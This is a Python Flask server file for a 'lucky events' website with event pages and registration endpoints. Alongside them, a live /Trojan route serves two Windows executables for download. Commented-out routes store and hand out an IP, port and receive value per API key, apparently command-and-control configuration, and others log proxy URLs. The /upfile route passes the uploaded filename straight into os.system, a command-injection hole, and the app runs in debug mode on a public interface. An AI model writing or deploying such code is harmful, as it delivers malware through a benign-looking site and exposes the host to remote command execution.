import http
import time
from typing import TextIO

from flask import *
from time import ctime, sleep, time
from flask_sqlalchemy import SQLAlchemy

from Api.func_api import getPage, titleEventTime, idValid
from Api.manager import *


# /* configuration */
mainApp = Flask(__name__, template_folder="tmp")
mainApp.config['SQLALCHEMY_DATABASE_URI'] = f"sqlite:///{FILE_NAME_DB}"
mainApp.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False  # // default
mainApp.secret_key = binascii.hexlify(os.urandom(25)).decode()
DBase = SQLAlchemy(mainApp)


# /* DATABASES - FUNCTION */
def setEvent(**kwargs):
    new_event = EventsLucky(**kwargs)
    DBase.session.add(new_event)
    DBase.session.commit()


def controllerEvents():
    while True:
        sleep(1)
        for event in EventsLucky.query.all():
            if not titleEventTime(event.event_start, event.event_end)[1]:
                event.open = False  # !!


class EventsLucky(DBase.Model):
    __tablename__ = 'Events'
    event_id = DBase.Column(DBase.Integer, primary_key=True)
    event_name = DBase.Column(DBase.String(20), nullable=False)
    event_start = DBase.Column(DBase.String(100), nullable=False)
    event_end = DBase.Column(DBase.String(100), nullable=False)
    open = DBase.Column(DBase.Boolean, unique=False, default=True)
    will_open = DBase.Column(DBase.String(100), nullable=True, default=time())

    def __repr__(self):
        return "<Event %r>" % self.event_id

#
# # [!] CLASSES
# class SignUpUsers(DBase.Model):
#     __tablename__ = 'SignUp'
#     Id = DBase.Column(DBase.Integer, primary_key=True)
#     user = DBase.Column(DBase.String(20), nullable=False)
#     password = DBase.Column(DBase.String(500), nullable=False)
#
#     def __repr__(self):
#         return "<USER %r>" % self.user
#
#
# class Posts(DBase.Model):
#     __tablename__ = 'Posts'
#     _xNone = DBase.Column(DBase.Integer, primary_key=True)
#     idPostUser = DBase.Column(DBase.Integer, nullable=False)
#     user = DBase.Column(DBase.String(20), nullable=False)
#     post = DBase.Column(DBase.String(1000), nullable=False)
#     timepost = DBase.Column(DBase.String(50), default=ctime())
#
#     def __repr__(self):
#         return "<POST %r>" % self.user
#
#
# class ApiKeys(DBase.Model):
#     __tablename__ = 'api_keys'
#     Index = DBase.Column(DBase.Integer, primary_key=True)
#     ApiKey = DBase.Column(DBase.String(100), nullable=False)
#
#     def __repr__(self):
#         return "<Key %r>" % self.ApiKey
#
#
# class SetServerInfo(DBase.Model):
#     __tablename__ = 'Info'
#     _xNone = DBase.Column(DBase.Integer, primary_key=True)
#     api_key = DBase.Column(DBase.String(100), nullable=False)
#     ip = DBase.Column(DBase.String(20), nullable=False)
#     port = DBase.Column(DBase.String(1000), nullable=False)
#     recv = DBase.Column(DBase.String(20), nullable=False)
#
#
# class ProxRequest(DBase.Model):
#     __tablename__ = 'Redirect'
#     _xNone = DBase.Column(DBase.Integer, primary_key=True)
#     url = DBase.Column(DBase.String(100), nullable=False)
#
#     def __repr__(self):
#         return "<Red %r>" % self.url


# def deleteAll():
#     for i in SignUpUsers.query.all():
#         try:
#             DBase.session.delete(i)
#             DBase.session.commit()
#         except:
#             print("error")
#             continue
#
#
# @mainApp.route("/DefineHost", methods=['POST', "GET"])
# def DefineHost():
#     error = jsonify({"error": "Something wrong", "status": "key_not_definition"})
#     if request.method == 'POST':
#         if not ApiKeys.query.all():
#             return error
#
#         _key = request.form['api_key']
#         _ip = request.form['ip']
#         _port = request.form['port']
#         _recv = request.form['recv']
#         if not ApiKeys.query.filter_by(ApiKey=_key).first():
#             return error
#         if not SetServerInfo.query.all():
#             ch = SetServerInfo(api_key=_key, ip=_ip, port=_port, recv=_recv)
#             DBase.session.add(ch)
#             DBase.session.commit()
#             return jsonify({"error":"no", "status": "successfully"})
#
#         ch = SetServerInfo.query.filter_by(api_key=_key).first()
#         if not ch:
#             ch = SetServerInfo(api_key=_key, ip=_ip, port=_port, recv=_recv)
#             DBase.session.add(ch)
#             DBase.session.commit()
#             return jsonify({"error": "no", "status": "successfully"})
#         if _ip:
#             ch.ip = _ip
#         if _port:
#             ch.port = _port
#         if _recv:
#             ch.recv = _recv
#         DBase.session.commit()
#         return jsonify({"error": "no", "status": "successfully"})
#     elif request.method == 'GET':
#         return "<h1>hello hacker, you search Something, ok, fuck off!</h1>"


@mainApp.route("/dvir", methods=['GET'])
def DvirProducation():

    return render_template('index.html')


# @mainApp.route("/HostServer", methods=['POST', "GET"])
# def RetIPServer():
#     if request.method == "POST":
#         key = request.form['key']
#         if not key:
#             return jsonify({"error": True})
#         for data in SetServerInfo.query.all():
#             if key == data.api_key:
#                 return jsonify({"error": False, "ip": data.ip, "port": int(data.port), "recv": int(data.recv), 'lang':'en'})
#
#         return jsonify({"error": True})
#     return "<h1>hey? you search Something, ok, but not here</h1>"


@mainApp.route("/Trojan", methods=["POST", "GET"])
def post_file():
    """download"""
    FILES = "SocketServer4.exe", "NOODx4.exe"
    if request.method == "GET":
        return send_from_directory("/home/albert/Flask_1_0", FILES[int(request.args.get("t"))], as_attachment=True)


@mainApp.route("/upfile", methods=["POST"])
def UpFile():
    """
        %-from google-%
        Upload a file.
    """
    file = request.files['file']
    os.system(f"rm {file.filename}")

    if "/" in file.filename:
        abort(400, "subdirectories disallowed. please upload .*")

    with open(os.path.join("/home/albert/Flask_1_0", file.filename), "wb") as fp:
        fp.write(file.stream.read())

    # Return 201 CREATED
    return "", 201


# @mainApp.route("/1GET", methods=['GET', 'POST'])
# def prox():
#     if request.method == "GET":
#         data1 = request.args.get("p1")
#         ok = ProxRequest(url=data1)
#         DBase.session.add(ok)
#         DBase.session.commit()
#
#     return jsonify({"stat":"ok"})


# @mainApp.route("/proxData", methods=["POST"])
# def GetProx():
#     return jsonify({"data":[x.url for x in ProxRequest.query.all()]})
#
# #
# @mainApp.route("/clearprox", methods=['GET', 'POST'])
# def ClearProx():
#     for x in ProxRequest.query.all():
#         DBase.session.delete(x)
#         DBase.session.commit()
#
#     return jsonify({"stat":"OK"})


# /* API REQUEST: JSON */
@mainApp.route("/events", methods=['POST'])
def Events():
    name_event = request.form.get('name')
    # /* verify requests 'name' */
    page: str = getPage(name_event)
    if not page: return jsonify({"success": False, "page": page, "des": None})
    # /* query db */
    event = EventsLucky.query.filter_by(event_name=page).first()
    if event.open:
        return jsonify({"success": True, "page": page, "des": "open"})
    else:
        return jsonify({"success": False, "page": "/",
                        "des": DES_EVENT_CLOSED.format(en=page, eo=ctime(float(event.will_open)))})


# /* API REQUEST: JSON */
@mainApp.route("/timer_event", methods=['POST'])
def TimerEvent():
    n_event = request.form.get("event")
    event_time_s: int = time()
    event_time_e: int = time()+10000
    if not n_event: return jsonify({"success": False})
    if n_event == EManager.alpha:
        pass
    elif n_event == EManager.rasta:
        pass
    elif n_event == EManager.product:
        pass
    return jsonify({"success": True, "event_time": ctime(event_time_e),
                    "title_event": titleEventTime(event_time_s, event_time_e)[0]})


# /* API REQUEST: TEXT/HTML */
@mainApp.route("/eventhtml", methods=['POST'])
def eventData():
    file: str = ""
    if request.cookies.get("anonymous"):  # and session.get('player'):
        if request.form.get("type") == '1':
            file = "tmp/ltmp/event_registerL1.html"
        elif request.form.get("type") == '2':
            file = "tmp/ltmp/event_registerL1.html"
        elif request.form.get("type") == '3':
            file = "tmp/ltmp/event_registerL2.html"
        else:
            return render_template_string("<h1>none</h1>")

        stream: TextIO = open(file, "r", encoding='utf-8')
        html: str = stream.read()
        stream.close()
        return render_template_string(html)


# /* API REQUEST: JSON */
@mainApp.route("/register_event", methods=['POST'])
def RegisterEvent():
    lvl: str = request.form.get("lvl")
    if lvl == "1":
        # /* get from json request */
        name: str = request.form.get('name')
        phone: str = request.form.get('phone')
        _id: str = request.form.get("id")
        # /* verify */
        if not (name and phone and _id) or not (name.__len__() > 6 and phone.__len__() == 10 and idValid(_id)):
            return jsonify({"success": False})
    elif lvl == "2":
        pass
    else:
        # /* wtf with the request */
        return jsonify({"success": False})

    # TODO: save on db, create session
    # /* success */
    return jsonify({"success": True})


@mainApp.route("/", methods=['GET', 'POST'])
@mainApp.route("/index", methods=['GET', 'POST'])
@mainApp.route("/home", methods=['GET', 'POST'])
def Index():
    res = make_response(render_template("index.html"))
    res.set_cookie(key="anonymous", value=SESSION_ANON(), httponly=True)
    res.headers['AppLucky'] = "IKWAYDoing!"
    return res


@mainApp.route("/rasta", methods=["GET"])
def Rasta():
    if not request.cookies.get('anonymous'): return redirect(url_for("Index"))
    register = session.get('player') and not request.cookies.get("anonymous")
    return render_template('rasta.html', event="rasta", register=register)


@mainApp.route("/alpha", methods=["GET"])
def Alpha():
    if not request.cookies.get('anonymous'): return redirect(url_for("Index"))
    return render_template('alpha.html')


@mainApp.route("/product", methods=["GET"])
def Product():
    if not request.cookies.get('anonymous'): return redirect(url_for("Index"))
    return render_template('product.html')


@mainApp.route("/console", methods=["GET", "POST"])
def Console():
    return abort(http.HTTPStatus.CONFLICT, "you want to run console?, ammm I.D.T.S & Y.C.S.M.D")


if __name__ == "__main__":  # // localdick!
    with mainApp.app_context():
        DBase.create_all()
        # /* CONFIGURATion on first time */
        if not EventsLucky.query.all():
            setEvent(event_name="rasta", event_start=time(), event_end=time() + EManager.rasta_time)
            setEvent(event_name="alpha", event_start=time(), event_end=time() + EManager.alpha_time)
            setEvent(event_name="product", event_start=time(), event_end=time() + EManager.product_time)

    mainApp.run(host="0.0.0.0", port=80, debug=True)




